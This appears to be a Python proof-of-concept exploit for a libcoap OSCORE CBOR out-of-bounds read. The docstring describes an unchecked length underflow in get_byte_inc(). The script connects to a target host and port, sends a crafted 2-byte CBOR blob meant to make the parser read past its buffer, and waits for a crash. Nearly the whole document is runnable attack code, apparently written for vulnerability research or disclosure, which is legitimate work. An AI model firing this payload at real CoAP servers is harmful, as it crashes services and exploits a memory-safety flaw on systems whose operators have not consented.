#!/usr/bin/env python3
"""
PoC for CVE-2026-29013 - libcoap OSCORE CBOR get_byte_inc() OOB read (CWE-125).

oscore_cbor_get_element_size() reads a CBOR control byte. For additional-info
0x1b (control byte 0x1b -> "next 8 bytes are the integer") it loops get_byte_inc()
8 times. get_byte_inc() does an unchecked `(*buf_len)--` (assert compiled out
under NDEBUG); with a buffer far shorter than 8 bytes, buf_len underflows from 0
to SIZE_MAX and the parser reads off the end of the buffer -> ASan
heap-buffer-overflow / SIGSEGV.

We send a 2-byte CBOR blob: 0x1b (uint, 8 following bytes) + one filler byte.
The parser then tries to consume 8 follow-on bytes from a 2-byte buffer.

Usage: poc_cve_2026_29013.py [host] [port]
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5683

# 0x1b = CBOR major type 0 (unsigned int), additional info 27 => 8-byte integer
# follows. Provide nowhere near 8 bytes so the get_byte_inc loop runs off the end.
blob = bytes([0x1b, 0x00])

print(f"[*] Connecting to {host}:{port}")
s = socket.create_connection((host, port), timeout=5)
print(f"[*] Sending {len(blob)}-byte CBOR kid_context: {blob.hex()}")
s.sendall(blob)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
try:
    data = s.recv(256)
    print(f"[*] Server response: {data!r}")
except OSError as e:
    print(f"[*] Connection closed/reset (expected on crash): {e}")
s.close()
print("[*] Done. Check `docker logs` for the ASan OOB-read / SIGSEGV trace.")
